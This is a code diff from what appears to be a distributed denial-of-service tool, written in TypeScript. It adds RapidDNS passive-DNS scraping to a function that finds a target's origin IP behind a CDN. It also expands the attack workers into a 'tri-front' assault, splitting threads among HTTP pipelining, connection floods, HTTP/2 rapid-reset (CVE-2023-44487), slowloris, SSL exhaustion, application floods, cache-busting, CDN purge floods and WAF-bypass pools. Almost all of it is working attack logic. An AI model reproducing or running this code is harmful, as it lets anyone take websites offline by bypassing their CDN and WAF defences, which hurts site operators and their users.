@@ -626,7 +626,7 @@ async function _findOriginIPForAttack(hostname: string, cdnIPs: string[]): Promi
   const mu   = new Set<string>(); // dedup in-flight
 
   // Collect ALL candidate IPs from ALL sources in parallel, then verify all at once
-  const [subResults, ipv6Results, txtResults, mxResults, crtResults, htResults, viewDnsResults] = await Promise.allSettled([
+  const [subResults, ipv6Results, txtResults, mxResults, crtResults, htResults, viewDnsResults, rapidDnsResults] = await Promise.allSettled([
     // 1. Subdomains — all resolved simultaneously
     Promise.allSettled(BYPASS_SUBS.map(sub =>
       dnsP.resolve4(`${sub}.${hostname}`).catch(() => [] as string[])
@@ -698,6 +698,28 @@ async function _findOriginIPForAttack(hostname: string, cdnIPs: string[]): Promi
         }
         if (ips.length > 0) console.log(`[origin-discovery] ViewDNS found ${ips.length} historical IPs for ${hostname}`);
         return [...new Set(ips)];
+      } catch { clearTimeout(timer); return [] as string[]; }
+    })(),
+    // 8. RapidDNS — passive DNS database with historical subdomain-to-IP mappings
+    //    Often catches subdomains that crt.sh misses (different cert issuers)
+    (async () => {
+      const baseDom = hostname.split(".").slice(-2).join(".");
+      const ac = new AbortController();
+      const timer = setTimeout(() => ac.abort(), 9_000);
+      try {
+        const r = await fetch(
+          `https://rapiddns.io/subdomain/${baseDom}?full=1&down=1`,
+          { headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", "Accept": "text/html" }, signal: ac.signal }
+        );
+        clearTimeout(timer);
+        const html = await r.text();
+        const subs: string[] = [];
+        for (const m of html.matchAll(/([a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,}/g)) {
+          const s = m[0].toLowerCase().replace(/\.$/, "");
+          if ((s.endsWith(`.${baseDom}`) || s === baseDom) && !s.includes("rapiddns") && !s.includes("cloudflare")) subs.push(s);
+        }
+        if (subs.length > 0) console.log(`[origin-discovery] RapidDNS found ${subs.length} subdomains for ${hostname}`);
+        return [...new Set(subs)];
       } catch { clearTimeout(timer); return [] as string[]; }
     })(),
   ] as const);
@@ -777,6 +799,21 @@ async function _findOriginIPForAttack(hostname: string, cdnIPs: string[]): Promi
     const vdIps = viewDnsResults.value as string[];
     for (const ip of vdIps) {
       if (!_isCFIP(ip) && !seen.has(ip) && !mu.has(ip)) { mu.add(ip); candidates.unshift(ip); } // unshift = higher priority
+    }
+  }
+
+  // Collect from RapidDNS — resolve each subdomain to IP (passive DNS, catches missed subdomains)
+  if (rapidDnsResults.status === "fulfilled" && (rapidDnsResults.value as string[]).length > 0) {
+    const rdSubs = rapidDnsResults.value as string[];
+    const rdIpLists = await Promise.allSettled(
+      rdSubs.slice(0, 80).map(sub => dnsP.resolve4(sub).catch(() => [] as string[]))
+    );
+    for (const r of rdIpLists) {
+      if (r.status === "fulfilled") {
+        for (const ip of r.value) {
+          if (!_isCFIP(ip) && !seen.has(ip) && !mu.has(ip)) { mu.add(ip); candidates.push(ip); }
+        }
+      }
     }
   }
 
@@ -1382,42 +1419,54 @@ async function runAttackWorkers(
     const originIP = await _findOriginIPForAttack(hostname, cdnIPs).catch(() => null);
 
     if (originIP) {
-      console.log(`[origin-bypass] ✓ Origin IP: ${originIP} — dual-front attack started`);
-      // 70% threads → direct origin attack (bypasses CDN entirely)
-      const originT   = Math.ceil(threads * 0.70);
-      const pipeT_ob  = Math.ceil(originT * 0.30);
-      const connT_ob  = Math.ceil(originT * 0.20);
-      const h2rstT_ob = Math.ceil(originT * 0.20);
-      const slowT_ob  = Math.ceil(originT * 0.15);
-      const sslT_ob   = Math.max(50, originT - pipeT_ob - connT_ob - h2rstT_ob - slowT_ob);
+      console.log(`[origin-bypass] ✓ Origin IP: ${originIP} — tri-front attack started (origin+CDN+purge)`);
+      // 75% threads → direct origin attack (bypasses CDN/WAF entirely)
+      const originT    = Math.ceil(threads * 0.75);
+      const pipeT_ob   = Math.ceil(originT * 0.18);  // HTTP/1.1 pipeline — raw TCP saturation
+      const connT_ob   = Math.ceil(originT * 0.12);  // connection table exhaustion (no rate limit)
+      const h2rstT_ob  = Math.ceil(originT * 0.18);  // H2 RST burst — CVE-2023-44487 on naked origin
+      const rstT_ob    = Math.ceil(originT * 0.18);  // rapid-reset ultra — sustained H2 stream storm
+      const appT_ob    = Math.ceil(originT * 0.14);  // app-smart-flood — DB query exhaustion
+      const slowT_ob   = Math.ceil(originT * 0.07);  // slowloris — fills accept() queue
+      const sslT_ob    = Math.max(50, originT - pipeT_ob - connT_ob - h2rstT_ob - rstT_ob - appT_ob - slowT_ob);
 
-      // 30% threads → CDN edge exhaustion (forces 100% origin cache misses)
-      const cdnT      = Math.max(100, threads - originT);
-      const cacheT_ob = Math.ceil(cdnT * 0.55);
-      const wafT_ob   = Math.max(80, cdnT - cacheT_ob);
+      // 25% threads → CDN edge exhaustion + forced cache invalidation
+      const cdnT       = Math.max(100, threads - originT);
+      const cacheT_ob  = Math.ceil(cdnT * 0.40);  // cache poison — unique keys force 100% origin miss
+      const purgeT_ob  = Math.ceil(cdnT * 0.25);  // cdn-purge-flood — invalidates cached entries
+      const wafT_ob    = Math.max(80, cdnT - cacheT_ob - purgeT_ob);
 
       await Promise.all([
-        // ── Front 1: direct origin IP attack (sni=hostname so TLS handshake succeeds RFC-6066)
-        spawnPool("http-pipeline",  originIP, 80,  pipeT_ob,  Math.max(4, CPU_COUNT),                   signal, onStats, undefined, hostname),
-        spawnPool("conn-flood",     originIP, 443, connT_ob,  1,                                         signal, onStats, undefined, hostname),
-        spawnPool("h2-rst-burst",   originIP, 443, h2rstT_ob, Math.max(4, CPU_COUNT),                   signal, onStats, undefined, hostname),
-        spawnPool("slowloris",      originIP, 80,  slowT_ob,  1,                                         signal, onStats, undefined, hostname),
-        spawnPool("ssl-death",      originIP, 443, sslT_ob,   2,                                         signal, onStats, undefined, hostname),
-        // ── Front 2: CDN edge cache exhaustion ───────────────────────────
-        spawnPool("cache-poison",   target,   port, cacheT_ob, 2,                                         signal, onStats),
-        spawnPool("waf-bypass",     target,   port, wafT_ob,   Math.max(4, Math.floor(CPU_COUNT / 2) + 2), signal, onStats),
+        // ── Front 1: direct origin IP attack (SNI=hostname bypasses CDN, RFC-6066)
+        spawnPool("http-pipeline",   originIP, 80,  pipeT_ob,  Math.max(4, CPU_COUNT),                    signal, onStats, undefined, hostname),
+        spawnPool("conn-flood",      originIP, 443, connT_ob,  1,                                          signal, onStats, undefined, hostname),
+        spawnPool("h2-rst-burst",    originIP, 443, h2rstT_ob, Math.max(4, CPU_COUNT),                    signal, onStats, undefined, hostname),
+        spawnPool("rapid-reset",     originIP, 443, rstT_ob,   Math.max(4, CPU_COUNT),                    signal, onStats, undefined, hostname),
+        spawnPool("app-smart-flood", originIP, 80,  appT_ob,   Math.max(4, Math.floor(CPU_COUNT / 2) + 2),signal, onStats, undefined, hostname),
+        spawnPool("slowloris",       originIP, 80,  slowT_ob,  1,                                          signal, onStats, undefined, hostname),
+        spawnPool("ssl-death",       originIP, 443, sslT_ob,   2,                                          signal, onStats, undefined, hostname),
+        // ── Front 2: CDN edge exhaustion + cache invalidation (makes CDN useless) ─────
+        spawnPool("cache-poison",    target, port, cacheT_ob, 2,                                           signal, onStats),
+        spawnPool("cdn-purge-flood", target, port, purgeT_ob, 2,                                           signal, onStats),
+        spawnPool("waf-bypass",      target, port, wafT_ob,   Math.max(4, Math.floor(CPU_COUNT / 2) + 2), signal, onStats),
       ]);
       return;
     } else {
-      console.log(`[origin-bypass] ✗ No origin IP found — fallback bypass-storm`);
-      // Fallback: run bypass-storm (multi-vector WAF bypass) + aggressive cache poisoning
-      const wafFallT  = Math.max(400, Math.ceil(threads * 0.65));
-      const cacheFallT = Math.max(100, threads - wafFallT);
+      console.log(`[origin-bypass] ✗ No origin IP found — fallback 6-vector storm`);
+      // Fallback: 6 simultaneous vectors — covers H2, WAF evasion, cache and app layers
+      const wafFallT   = Math.max(400, Math.ceil(threads * 0.45));
+      const rstFallT   = Math.max(300, Math.ceil(threads * 0.40));
+      const h2FallT    = Math.max(200, Math.ceil(threads * 0.35));
+      const appFallT   = Math.max(200, Math.ceil(threads * 0.35));
+      const cacheFallT = Math.max(100, Math.ceil(threads * 0.20));
+      const purgeFallT = Math.max(80,  Math.ceil(threads * 0.15));
       await Promise.all([
-        spawnPool("waf-bypass",   target, port, wafFallT,   Math.max(4, Math.floor(CPU_COUNT / 2) + 2), signal, onStats),
-        spawnPool("h2-rst-burst", target, port, wafFallT,   Math.max(4, CPU_COUNT),                     signal, onStats),
-        spawnPool("cache-poison", target, port, cacheFallT, 2,                                           signal, onStats),
-        spawnPool("app-smart-flood", target, port, Math.ceil(threads * 0.40), Math.max(4, Math.floor(CPU_COUNT / 2) + 2), signal, onStats),
+        spawnPool("waf-bypass",      target, port, wafFallT,   Math.max(4, Math.floor(CPU_COUNT / 2) + 2), signal, onStats),
+        spawnPool("rapid-reset",     target, port, rstFallT,   Math.max(4, CPU_COUNT),                     signal, onStats),
+        spawnPool("h2-storm",        target, port, h2FallT,    Math.max(4, CPU_COUNT),                     signal, onStats),
+        spawnPool("app-smart-flood", target, port, appFallT,   Math.max(4, Math.floor(CPU_COUNT / 2) + 2), signal, onStats),
+        spawnPool("cache-poison",    target, port, cacheFallT, 2,                                           signal, onStats),
+        spawnPool("cdn-purge-flood", target, port, purgeFallT, 2,                                           signal, onStats),
       ]);
       return;
     }
